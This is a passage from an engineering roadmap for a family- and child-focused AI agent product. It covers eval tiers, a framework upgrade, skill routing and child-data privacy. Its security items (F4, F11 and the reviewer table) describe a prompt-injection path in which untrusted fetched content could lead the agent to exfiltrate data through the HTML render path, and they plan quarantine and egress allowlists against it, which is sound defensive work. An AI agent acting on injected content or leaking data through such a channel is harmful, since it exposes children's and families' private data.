  nightly. Not free and not fully deterministic in outcome (expect flakes);
  path-filter and start non-blocking, promote to required after two weeks
  green.
- **F1-tier2 (XL, standing program, deferred: re-evaluate September 1 or at
  20 active families).** LLM-judged nightly under `--strict` for the semantic
  laws only (reassure-before-inform, distress conduct), judges soft-thresholded
  first, plus a nightly deterministic voice-lint over *production*
  `conversation_messages` (the cheapest, highest-signal sensor, catches
  post-compaction drift synthetic evals cannot).
- **F1-tier3 (weekly, browser-based).** Promote `scripts/_tmp_season_sim/` to
  a maintained slice, rebuilding a "Vega-lite" family from a seed script each
  run (Vega is accreted evidence, not a fixture). Client-side failures
  (BUG-P2-1 stream death, hydration) are invisible to protocol-level evals, so
  this tier stays browser-driven on purpose.

  Infrastructure the tiers need and the earlier draft omitted: an
  `AI_GATEWAY_API_KEY` CI secret, a scheduled workflow (only `ci.yml` exists
  today), and a *seeded disposable eval family* authenticated via
  `EVE_EVAL_AUTH_TOKEN` against `eve eval --url` (local targets send no auth on
  0.19, so an unauthenticated eval falls through to `localDev()` with empty
  attributes and gets no family). Use a fresh synthetic family per run
  following the `recall-eval.mts` and `isolation-check.mjs` patterns, not the
  disposable-Postgres cluster (the agent path needs Supabase Auth, RLS, and
  storage). Budget eval upkeep as a standing tax: the gateway model alias
  shifts behavior with zero repo diff, instructions edits invalidate fixtures
  by design, and one person triages nightly failures.

**F2. Completion contracts for background and promised work.**
- **F2a (S).** The instruction rule above (first-three item 1), plus a routing
  test.
- **F2b (M).** Bind the *existing* `homa_task_runs` slots (`summary`,
  `artifacts`, `delivered_channel`) and `conversation_deliveries` receipts to
  a completion contract: outcome, verification surface (a delivery row, a
  material id, an observation consumed), blocked_reason. Finished by evidence,
  not by the model saying so.

**F3. The eve 0.19 to 0.23 jump as a named project (L, scheduled, not now).**
Complete M1-15 (session rotation) first; it is the runbook's real prerequisite
and lets the jump sidestep replay divergence by rotating rather than replaying
(5.3). Run `eve-upgrade-check.mjs` pairwise across each hop locally, re-prove
the pnpm patch against each candidate's re-minified `dist`, then make one
production jump. Measure the cache delta on real traffic afterward. Schedule
it in a quiet window after the sim P0s ship and the conference cohort's first
week stabilizes, and before the wall flips; the risk compounds from here.
Drill failures are logged in the churn log as evidence for the standing eject
tripwire, which stays in force unchanged through the jump (7.1).

**F4. Quarantine untrusted content (L, prefer post-jump).**
One declared subagent authored *closed*: its own `tools/` with only Firecrawl
`web_fetch` plus `disableTool()` sentinels for `bash` and `write_file` (root
sentinels do not inherit), its own deny-all `sandbox.ts`, its own copies of
the usage and tool-call ledger hooks (hooks do not inherit, or usage and
persistence go dark), no family context, bounded `outputSchema` out; the
parent treats the summary as untrusted and never routes it to an egress sink.
`web_fetch` moves inside it. Prefer landing after the eve jump so it is built
once on 0.21+ subagent accounting, and note it complements, not replaces,
M2-14's content scanning (which covers captions, OCR text, and email bodies
the reader never sees).

**F5. Skill rigor.**
Per-skill routing fixtures (positive and adversarial-negative) extending
`check:skills-targeting`; `save_skill` emits one positive and one negative
routing fixture at save time, stored on the row; the resolver catch emits an
ops event and retries once before going dark (closes the BUG-P5-3 class); a
reachability audit so every published bank row advertises to at least one
fixture family and zero-advertisement-in-30-days skills page the founder; a
dedup check at save time; version history and conversation-id provenance on
`family_skills` and `skill_bank`; a family-over-bank shadow signal. Full
bundle bar for the bank; caps, scan, and fixtures for family rows. Do not
auto-load skill bodies on a substring match (a fat-harness reflex that does
not even fix BUG-P5-3); test the routing first and revisit only if fixtures
show the model skipping `load_skill`. The resolver-alarm and routing-fixture
pieces are S and belong in the first-three window.

**F6. Model mix, cheap wins first (S now, more post-jump).**
Set `compaction.model` to a cheap tier (supported in 0.19 config; today it
runs on Sonnet 5). Captions and extraction already cheap. After the jump, use
dynamic model selection for briefs and journal turns. Defer router-subagent
complexity until Agent Runs data says where the money goes.

**F7. Memory loop repair (S to M).**
Retire or fix the zero-save extractor (its prompt refuses everything
week-scoped by design). Give observations a reader via the season sim's R10
per-kid journal (same feature; build once there, contribute the packet-builder
shape).

**F8. Observability quick wins (S).**
Verify Agent Runs on the production project and wire the CLI into the ops
runbook; meter compaction tokens; add the SMS receipt-age alarm; add
dark-skill and ungoverned-`agent`-tool telemetry.

**F9. Soul-file audit under the zero-aspirational-rules test (S, ongoing).**
Tag each section with the failure it traces to; move untriggered procedure to
skills or channel modes (5.6); kill the four-place `send_heads_up`
duplication. Add parity checks for the two hand-kept mirrors the soul-file
header documents (the Voice mirror into `report-writer.md`, the
telnyx-provision heading split); `report-writer-version.ts` is the in-repo
precedent. Verify eve strips the editor-facing HTML comment from the
model-facing prompt.

**F10. Product CONTEXT glossary (S).**
One page: episode, open loop, observation, evidence, check-in, map snapshot,
binder, final, task run. Cheap, compounding, but never displacing a P0.

**F11. Egress boundary for untrusted-content sinks (S to M, security).**
A subresource host allowlist on printable HTML (family blob plus approved font
and CDN hosts) enforced in `page-shell`, plus `page.setRequestInterception` in
`render-page.ts` to drop off-allowlist fetches. Closes the render-time exfil
channel (5.1) independent of whether F4 ever ships. Audit the other
app-runtime egress paths (Firecrawl, SerpAPI, `keep_photo`, `generate_image`)
for the same class.

**F12. Minors'-media floor (S to M, child-data).**
Enforce the D4 short-TTL expiry on raw child photos and make minors' media
private-by-default (signed, expiring URLs rather than permanent public blobs;
`child-photos.ts` stores `access:"public"` today). Decide SMS-sender
verification, or explicitly accept that SMS is unauthenticated for
family-scoped data, as a founder ruling.

**Do-not-do-this-year:** the F1-tier2 nightly-judge program at current scale
(keep as named-event drills); persona-lens panel generalization beyond the
copy gates and materials review; Agent Skills standard alignment for repo
skills and community-skill imports (no product value this year, real review
burden); OTel export (M4-03 owns it); any router-subagent model-mix machinery
beyond the F6 compaction-model line. None of these move a kid's score, a
mom's hour, or a family's renewal in 2026.

## 7. Paths we are on that deserve a deliberate alternatives check

1. **Harness: stay on eve vs eject.** eve is at 3.5K stars, 54 releases, 30
   contributors, absorbing the features we would otherwise build. Recommendation:
   stay, keep the eve-independence of tools and the continuity ledger (already
   true), and put the eject-window question to the founder as an explicit
   ruling *after* the F3 jump lands (7.1); do not retire it in this document.
2. **Skills substrate: rows vs the Agent Skills standard.** Runtime skills are
   DB rows (correct for tenancy). Repo skills nearly follow the open standard
   already; full alignment is deferred (no product value this year).
3. **Voice: Telnyx assistant vs eve-native.** The split-brain was forced by
   eve's missing voice channel; eve reused Chat SDK Twilio voice primitives at
   0.19 and the surface is moving. Revisit after the F3 jump.
4. **Curriculum atlas: docs vs runtime asset.** 129 profiles exist and the
   agent cannot see them; it re-fetches publisher pages by Firecrawl (paying
   cost and injection risk for knowledge we wrote down). Cheapest aligned
   option: per-family pinning of the 2 to 4 profiles a family uses, into the
   pinned-context block. New scope; date it rather than leaving it ambient.
5. **Anthropic-native context stack.** Server-side compaction, context
   editing, and the memory tool are first-party now; eve owns these concerns
   in our stack. No move; watch for eve adopting the provider primitives
   underneath.
6. **Dynamic workflows / model-authored orchestration.** eve re-gated it
   experimental; the A-to-Z batch case is better served by F2's task rows.
   Re-evaluate only if a real journey demands fan-out the dispatcher cannot
   express.

## 8. What to protect (the frontier would steal these from us)

1. **The conversation-continuity ledger.** Nothing in the corpus matches
   episodes, per-recipient deliveries, typed open loops, and
   never-guess-latest reply causation.
2. **Tenancy on the caller path with a live CI guard.** The corpus's isolation
   stories are markdown rules; ours is RLS plus a 2,733-line smoke test (with
   the pinned-path caveat in 5.4).
3. **The pinned-context doctrine.** Rebuilt-per-turn family context is the
   constraint-pinning the compaction research recommends, adopted early, and
   the thing that makes both session rotation and the F3 jump safe.
4. **The consumer-side upgrade gate.** Exact pin, drill script, runbook, churn
   log with an eject tripwire. This is *not* the corpus's publisher-side
   version-as-update-gate (§8.4 below); it is a distinct pattern the corpus has
   no page for, worth proposing to the wiki.
5. **The production skillify save loop.** A parent complaint becoming a
   permanent per-family skill in under a minute, injection-scanned and capped,
   is the compounding loop the field is chasing, even though the tested-bundle
   half is still to build (F5).
6. **The documentation ratchet.** Claim ledger, founder-ruling register, dated
   evidence, reconciliation guards.
7. **Deny-all sandbox and disabled shell**, on purpose, because the data is
   children's, with the honest caveat (5.4, F11) that app-runtime egress is not
   yet covered.

### 8.4 A correction the council forced

The earlier draft filed Homa's upgrade discipline under
[[wiki:version-as-update-gate]]. That pattern is publisher-side: the `version`
field is the update-delivery *trigger* to installed consumers, so automation
owns the bump. Homa's exact-pin-plus-drill is consumer-side dependency gating;
nothing ships to anyone when Homa bumps. It is a genuinely novel discipline
the corpus has not paged, and it should be proposed to the wiki as a new
pattern (consumer-side upgrade gate) rather than claimed as an existing one.

## 9. Council review round

Five independent read-only reviewers examined revision 1, each instructed to
verify load-bearing claims against the code before criticizing. Verdicts:

| Reviewer | Verdict | Sharpest finding |
|---|---|---|
| Security and child-data red team | NEEDS MAJOR REVISION | The render-path exfiltration channel (now F1-severity, §5.1, F11) |
| Skeptical agent-infra architect | SOUND WITH REVISIONS | F4 quarantine would invert the posture; the built-in `agent` tool is live and ungoverned |
| Fat-skills practitioner | SOUND WITH REVISIONS | Skillify praise overstated (save half only); version-gate misfiled; Appendix B misreads |
| Bootstrapped-founder realist | SOUND WITH REVISIONS | Subordinate to the sim P0s; F1 is secretly XL; rename R to F |
| Evals engineer | SOUND WITH REVISIONS | "Tier 1 deterministic and free" is a category error; the fixture and auth strategy was missing |

**Cross-cutting findings adopted:**

1. The document had a real security hole in its own subject matter (the
   render-path exfil), found by verifying `page-shell.ts` and `render-page.ts`.
   Promoted to the top of the executive summary and to F11.
2. The recommendation set was renumbered R to F to stop colliding with the
   season sim's R1 to R17, and section 6 now opens by subordinating the whole
   document to the sim's still-open P0 bugs.
3. Two factual self-contradictions were corrected: "no subagents" versus a
   live built-in `agent` tool, and a compaction-on-a-cheaper-model claim the
   config does not make.
4. The eve-jump case was re-argued on compounding risk with M1-15 as its
   prerequisite and rotate-don't-replay as its method, not on cache savings.
5. The eval floor was split into an honest four tiers with the multi-tenant
   fixture-and-auth strategy the draft omitted, and the cheapest sensor (a
   production voice-lint) added.
6. The eject tripwire is kept in force; retiring it becomes an explicit
   post-jump founder decision, not this document's call.
7. Appendix B corrected: persona-lens (the copy gates and this council are the
   real instances; materials review is the cousin), skill-as-method-call
   (skills not tools; real after F2), session-start-directive (applicable, not
   n/a), version-as-update-gate (novel consumer-side pattern).

**Disagreements left standing (recorded, not resolved):**

- The security reviewer ranks the egress boundary (F11) above quarantine (F4)
  as the priority injection mitigation; adopted (F11 is in the first three,
  F4 is deferred post-jump).
- The evals reviewer would not gate tier 1 per-PR unconditionally; adopted
  (path-filtered, non-blocking until two weeks green).
- The architect argues one production jump with staged local drills; adopted
  (5.3, F3).
- The founder realist argues the eval floor is a second-month priority behind
  the sim P0s and the money work; adopted (section 6 preamble and first-three
  ordering), while keeping F1-tier0 startable now.

## Appendix A · eve 0.19.0 to 0.23.0, changes that matter to Homa

From the upstream CHANGELOG (read 2026-07-13). Note eve 0.19.0 already bundles
the `@workflow/core` 5.0.0-beta line; the churn across this range is
beta-to-beta within 5.0 plus the replay-format hazard the drill exists to
catch, and the pnpm patch (a regex edit to minified `dist`) must be re-proven
per candidate version.

| Version | Change | Why Homa cares |
|---|---|---|
| 0.20.0 | Cooperative AbortSignal end to end; sandbox shutdown on SIGTERM; missing attachment degrades instead of failing | turn-cancellation groundwork; resiliency |
| 0.21.0 | Session token limit pauses into HITL continue-or-stop instead of failing | runaway-cost guard becomes a parent prompt |
| 0.21.0 | Subagent token usage reported to parent; OTel `invoke_agent` spans | makes F4 cheaper (no hook duplication for usage) |
| 0.21.0 | Delegated subagents share parent quota; depth caps inherited | safe delegation budgeting |
| 0.22.0 | `defineDynamic` scoped dynamic model selection (session/turn/step) | F6 model mix without redeploys |
| 0.22.0 | Invalid tool input returned to model as error, not thrown | self-correcting tool calls; kills a silent failure class |
| 0.22.1 | Session sandboxes keyed per durable session; survive redeploys | retires "deploys orphan /workspace"; changes M0-03 planning |
| 0.22.2 | Anthropic prompt cache breakpoint fix (hit rate was capped near 50 percent) | chat-bill lever, bounded by turn-boundary misses (5.3); binding-to-gateway-path unverified |
| 0.22.2 | Transient provider overload retries inside streams | fewer mid-turn deaths |
| 0.22.3 | Mounted extensions; hardened frontmatter (no code-capable engines anywhere) | packaging option; supply-chain guard |
| 0.22.5 | `maxSubagentDepth` default drops 3 to 1 | check on upgrade; also relevant to the ungoverned `agent` tool (2.3) |
| platform | Agent Runs: auto-ingested traces, CLI and MCP (Jul 3), subagent tab (Jul 13) | observability with near-zero integration (F8) |

## Appendix B · research wiki pattern index vs Homa (one-line verdicts, corrected)

- evidence-gated-completion: absent; F1 and F2.
- latent-vs-deterministic-split: strong; scorer, matchers, consent regexes.
- persona-lens-review-panel: present at the build grain (copy-reviewer/editor
  gates, the §9 council); materials review is the generator-verifier cousin
  the wiki tracks separately; extend to product surfaces if F1-tier2 finds
  drift.
- skill-as-method-call: partial; repo skills are single-purpose by correct
  default, and task briefs gain the pattern only when F2's contract gives them
  a documented signature. Typed tool schemas are the deterministic layer, not
  this pattern.
- diarization: absent; F7's weekly kid page (the sim's R10) is the fit.
- session-start-directive: applicable, not n/a; five dynamics fire on
  `turn.started`, and `sms-mode`'s "FIRST action" heads-up law already uses
  the directive shape. Candidate uses: F2's never-promise law when dispatch
  wakes, and open-loop nudges that currently ride as passive continuity
  context.
- resolver-routing-table: partial; description-based plus targeted
  advertisement (tested), no routing fixtures; F5.
- single-source-multi-surface: strong (one agent, five channels); voice is the
  exception (7.3); the soul file's hand-kept mirrors need drift guards (F9).
- marketplace-as-multi-plugin: n/a today.
- skill-pack-bundle: save half only; F5.
- complexity-ratchet: strong for code and docs; absent for agent behavior
  until F1.
- version-as-update-gate: not this pattern; Homa's is a novel consumer-side
  upgrade gate (§8.4).
- thin-harness-fat-skills: aligned with the corrected reading (framework-owned
  harness); soul-file salience is the watch item (F9, 5.6).
- completion-contract: absent; F2.
- durable-agent-execution: inherited from eve; parked-session inventory gap
  (M1-15) is F3's prerequisite.
- filesystem-first-agent-framework: adopted by construction (eve).
- dynamic-workflows: correctly not adopted.
- trust-tiered privilege separation: absent; F4, and note the egress hole F11
  closes is upstream of it.
- workspace-skill-distribution: n/a (product skills are tenant rows by design).
- ubiquitous-language-for-agents: partial; F10.
